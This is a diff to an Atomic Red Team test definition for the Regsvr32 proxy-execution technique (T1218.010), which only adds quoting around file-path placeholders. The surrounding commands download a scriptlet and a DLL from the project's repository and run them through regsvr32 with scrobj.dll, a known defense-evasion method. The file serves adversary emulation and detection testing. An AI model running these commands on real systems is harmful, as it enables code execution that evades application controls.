@@ -25,13 +25,13 @@ atomic_tests:
   - description: |
       Regsvr32.sct must exist on disk at specified location (#{filename})
     prereq_command: |
-      if (Test-Path #{filename}) {exit 0} else {exit 1}
+      if (Test-Path "#{filename}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
   executor:
     command: |
-      #{regsvr32path}\#{regsvr32name} /s /u /i:#{filename} scrobj.dll
+      #{regsvr32path}\#{regsvr32name} /s /u /i:"#{filename}" scrobj.dll
     name: command_prompt
 
 - name: Regsvr32 remote COM scriptlet execution
@@ -83,9 +83,9 @@ atomic_tests:
   - description: |
       AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
     prereq_command: |
-      if (Test-Path #{dll_name}) {exit 0} else {exit 1}
+      if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
   executor:
     command: |
@@ -150,10 +150,12 @@ atomic_tests:
   dependency_executor_name: powershell
   dependencies:
   - description: AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
-    prereq_command: 'if (Test-Path #{dll_name}) {exit 0} else {exit 1}'
+    prereq_command: |
+      if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
     get_prereq_command: |-
-      New-Item -Type Directory (split-path #{dll_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
   executor:
-    command: '#{regsvr32path}\#{regsvr32name} /s /i #{dll_name}'
+    command: |
+      #{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
     name: command_prompt
